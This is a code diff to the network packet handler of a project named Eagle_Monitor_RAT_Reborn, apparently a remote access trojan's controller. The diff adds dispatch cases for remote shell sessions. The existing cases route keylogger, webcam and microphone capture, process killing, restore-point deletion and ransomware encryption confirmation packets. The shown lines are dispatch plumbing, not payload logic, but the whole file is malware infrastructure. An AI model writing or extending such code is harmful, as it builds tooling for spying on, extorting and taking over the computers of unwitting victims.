@@ -42,6 +42,12 @@ namespace Eagle_Monitor_RAT_Reborn.Network
 
                 case PacketType.AUDIO_RECORD_ON:
                     return;
+
+                case PacketType.SHELL_COMMAND:
+                    return;
+
+                /*case PacketType.SHELL_START:
+                    return;*/
             }
 
             string size = Misc.Utils.Numeric2Bytes(packet.packetSize);
@@ -186,7 +192,6 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     new ProcessKillerPacketHandler(processKillerPacket);
                     break;
 
-
                 case PacketType.PM_SUSPEND_PROCESS:
                     SuspendProcessPacket suspendProcessPacket = (SuspendProcessPacket)packet;
                     new SuspendProcessPacketHandler(suspendProcessPacket);
@@ -212,7 +217,6 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     new RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket);
                     break;
 
-
                 case PacketType.AUDIO_GET_DEVICES:
                     RemoteAudioPacket remoteAudioPacket = (RemoteAudioPacket)packet;
                     new RemoteAudioPacketHandler(remoteAudioPacket);
@@ -222,7 +226,6 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     RemoteAudioCapturePacket remoteAudioCapturePacket = (RemoteAudioCapturePacket)packet;
                     new RemoteAudioCapturePacketHandler(remoteAudioCapturePacket);
                     break;
-
 
                 case PacketType.MISC_INFORMATION:
                     InformationPacket informationPacket = (InformationPacket)packet;
@@ -250,7 +253,6 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     new DeleteRestorePointPacketHandler(deleteRestorePointPacket);
                     break;
 
-
                 case PacketType.KEYLOG_OFFLINE:
                     KeylogOfflinePacket keylogOfflinePacket = (KeylogOfflinePacket)packet;
                     new KeylogOfflinePacketHandler(keylogOfflinePacket, clientHandler);
@@ -259,6 +261,19 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                 case PacketType.RANSOMWARE_ENCRYPTION_CONFIRMATION:
                     RansomwareConfirmationPacket ransomwareConfirmationPacket = (RansomwareConfirmationPacket)packet;
                     new RansomareEncryptionConfirmationPacketHandler(ransomwareConfirmationPacket);
+                    break;
+
+                case PacketType.SHELL_COMMAND:
+                    StdOutShellSessionPacket stdOutShellSessionPacket = (StdOutShellSessionPacket)packet;
+                    new RemoteShellStdOutPacketHandler(stdOutShellSessionPacket);
+                    break;
+
+                case PacketType.SHELL_START:
+                    StartShellSessionPacket startShellSessionPacket = (StartShellSessionPacket)packet;
+                    new RemoteStartShellPacketHandler(startShellSessionPacket);
+                    break;
+
+                default:
                     break;
                     /*   
 
